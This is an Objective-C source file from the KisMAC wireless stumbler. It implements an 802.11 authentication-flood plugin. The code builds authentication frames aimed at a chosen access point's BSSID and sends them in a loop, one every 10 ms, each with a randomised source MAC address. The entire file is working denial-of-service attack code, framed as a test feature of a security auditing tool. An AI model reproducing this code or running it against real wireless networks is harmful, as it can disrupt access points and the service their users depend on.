/*
 
 File:			WavePluginAuthenticationFlood.m
 Program:		KisMAC
 Author:		pr0gg3d
 Changes:       Vitalii Parovishnyk(1012-2015)
 
 Description:	KisMAC is a wireless stumbler for MacOS X.
 
 This file is part of KisMAC.
 
 Most parts of this file are based on aircrack by Christophe Devine.
 
 KisMAC is free software; you can redistribute it and/or modify
 it under the terms of the GNU General Public License, version 2,
 as published by the Free Software Foundation;
 
 KisMAC is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
 along with KisMAC; if not, write to the Free Software
 Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#import "WavePluginAuthenticationFlood.h"
#import "WavePacket.h"
#import "WaveNet.h"
#import "WaveDriver.h"
#import "../Core/80211b.h"

@implementation WavePluginAuthenticationFlood

- (bool) startTest:(WaveNet*)net {
    
    KFrame *kframe = &_authFrame;
    struct ieee80211_auth *frame = (struct ieee80211_auth *)(kframe->data);
        
    if ([net type]!= networkTypeManaged)
        return NO;
    
    _status = WavePluginRunning;
    _stopFlag = NO;
    
    memset(kframe, 0, sizeof(KFrame));
    
    frame->header.frame_ctl = IEEE80211_TYPE_MGT | IEEE80211_SUBTYPE_AUTH;
    
    memcpy(frame->header.addr1, [net rawBSSID], 6);
    memcpy(frame->header.addr3, [net rawBSSID], 6);
    
    frame->algorithm = 0;
    frame->transaction = NSSwapHostShortToLittle(1);
    frame->status = 0;
    
    frame->header.seq_ctl=random() & 0x0FFF;
    
    kframe->ctrl.len = sizeof(struct ieee80211_auth);
    kframe->ctrl.tx_rate = [_driver currentRate];
    
    [NSThread detachNewThreadSelector:@selector(doAuthFloodNetwork:)
							 toTarget:self
						   withObject:nil];
	
    return YES;
}

- (void)doAuthFloodNetwork: (id)o {
    @autoreleasepool {
        UInt16 x[3];
        
        KFrame *kframe = &_authFrame;
        struct ieee80211_auth *frame = (struct ieee80211_auth *)(kframe->data);
        
        while (_stopFlag == NO) {
            x[0] = random() & 0x0FFF;
            x[1] = random();
            x[2] = random();
            
            memcpy(frame->header.addr2, x, 6); //needs to be random
            
            [_driver sendKFrame:kframe howMany:1 atInterval:0];
            [NSThread sleepUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.01]];
        }
    
    }
    _status = WavePluginIdle;

    return;
}

- (bool) stopTest {
    _stopFlag = YES;
    return YES;
}
@end
